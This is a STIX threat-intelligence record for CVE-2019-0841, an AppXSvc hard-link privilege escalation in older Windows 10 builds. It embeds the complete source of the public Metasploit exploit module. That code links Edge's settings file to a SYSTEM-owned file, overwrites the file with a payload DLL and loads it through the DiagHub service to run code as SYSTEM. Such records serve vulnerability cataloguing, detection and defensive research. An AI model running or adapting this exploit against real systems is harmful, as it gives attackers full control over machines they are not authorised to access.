{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26811507-1cdd-4372-a795-756fa831ebb0",
    "created": "2024-08-14T16:49:35.133722Z",
    "modified": "2024-08-14T16:49:35.133726Z",
    "name": "AppXSvc Hard Link Privilege Escalation",
    "description": " There exists a privilege escalation vulnerability for Windows 10 builds prior to build 17763. Due to the AppXSvc's improper handling of hard links, a user can gain full privileges over a SYSTEM-owned file. The user can then utilize the new file to execute code as SYSTEM.  This module employs a technique using the Diagnostics Hub Standard Collector Service (DiagHub) which was discovered by James Forshaw to load and execute a DLL as SYSTEM.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/appxsvc_hard_link_privesc.rb",
            "external_id": "appxsvc_hard_link_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-0841"
        },
        {
            "source_name": "reference",
            "url": "https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html"
        },
        {
            "source_name": "reference",
            "url": "https://0x00-0x00.github.io/research/2019/05/30/Coding-a-reliable-CVE-2019-0841-Bypass.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Exploit::EXE\n  include Post::File\n  include Post::Windows::Priv\n  include Post::Windows::FileInfo\n  include Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AppXSvc Hard Link Privilege Escalation',\n        'Description' => %q{\n          There exists a privilege escalation vulnerability for\n          Windows 10 builds prior to build 17763. Due to the AppXSvc's\n          improper handling of hard links, a user can gain full\n          privileges over a SYSTEM-owned file. The user can then utilize\n          the new file to execute code as SYSTEM.\n\n          This module employs a technique using the Diagnostics Hub Standard\n          Collector Service (DiagHub) which was discovered by James Forshaw to\n          load and execute a DLL as SYSTEM.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Nabeel Ahmed', # Vulnerability discovery and PoC\n          'James Forshaw',     # Code creating hard links and communicating with DiagHub service\n          'Shelby Pace'        # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2019-0841' ],\n          [ 'URL', 'https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/' ],\n          [ 'URL', 'https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html' ],\n          [ 'URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html' ],\n          [ 'URL', 'https://0x00-0x00.github.io/research/2019/05/30/Coding-a-reliable-CVE-2019-0841-Bypass.html' ]\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [ 'Windows 10', { 'Platform' => 'win' } ]\n        ],\n        'DisclosureDate' => '2019-04-09',\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def check\n    version = get_version_info\n    if version.build_number.between?(Msf::WindowsVersion::Win10_InitialRelease, Msf::WindowsVersion::Win10_1803)\n      return CheckCode::Appears\n    elsif version.build_number >= Msf::WindowsVersion::Win10_InitialRelease\n      return CheckCode::Detected\n    end\n\n    return CheckCode::Unknown\n  end\n\n  def upload_file(file_name, file_path)\n    contents = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-0841', file_name))\n    write_file(file_path, contents)\n    register_file_for_cleanup(file_path)\n  rescue StandardError\n    fail_with(Failure::UnexpectedReply, 'Failed to write file contents to target')\n  end\n\n  def init_process\n    print_status('Attempting to launch Microsoft Edge minimized.')\n    cmd_exec('cmd.exe /c start /min microsoft-edge:', nil, 30)\n  end\n\n  def mk_hard_link(src, target, link_exe)\n    out = cmd_exec(\"cmd.exe /c #{link_exe} \\\"#{src}\\\" \\\"#{target}\\\"\")\n\n    return (out && out.include?('Done'))\n  end\n\n  def write_payload\n    print_status('Writing the payload to disk')\n    code = generate_payload_dll\n    @original_data = read_file(@rtf_path)\n    write_file(@rtf_path, code)\n  end\n\n  def exploit\n    vuln_status = check\n    fail_with(Failure::NotVulnerable, 'Failed to detect Windows 10') if vuln_status == CheckCode::Unknown\n\n    fail_with(Failure::None, 'Already running with SYSTEM privileges') if is_system?\n    cmd_exec('taskkill /F /IM MicrosoftEdge.exe /FI \"STATUS eq RUNNING\"')\n    dat_path = expand_path('%USERPROFILE%\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\Settings\\\\Settings.dat')\n    fail_with(Failure::NotFound, 'Path does not exist') unless exist?(dat_path)\n\n    if session.arch == ARCH_X86\n      exe_name = 'CVE-2019-0841_x86.exe'\n      f_name = 'diaghub_load_x86.exe'\n    elsif session.arch == ARCH_X64\n      exe_name = 'CVE-2019-0841_x64.exe'\n      f_name = 'diaghub_load_x64.exe'\n    end\n    link_file_name = expand_path(\"%TEMP%\\\\#{Rex::Text.rand_text_alpha(6...8)}.exe\")\n    upload_file(exe_name, link_file_name)\n\n    @rtf_path = expand_path('%WINDIR%\\\\system32\\\\license.rtf')\n    fail_with(Failure::UnexpectedReply, 'Did not retrieve expected output') unless mk_hard_link(dat_path, @rtf_path, link_file_name)\n    print_good('Successfully created hard link')\n    init_process\n    cmd_exec('taskkill /F /IM MicrosoftEdge.exe')\n\n    write_payload\n    diaghub_path = expand_path(\"%TEMP%\\\\#{Rex::Text.rand_text_alpha(8..12)}\")\n    upload_file(f_name, diaghub_path)\n    cmd = \"\\\"#{diaghub_path}\\\" \\\"license.rtf\\\"\"\n    cmd_exec(cmd)\n  end\n\n  def cleanup\n    folder_path = expand_path('%TEMP%\\\\etw')\n    dir_rm(folder_path)\n\n    unless @rtf_path.nil?\n      write_file(@rtf_path, @original_data)\n    end\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-09",
    "x_mitre_platforms": [
        "win'"
    ]
}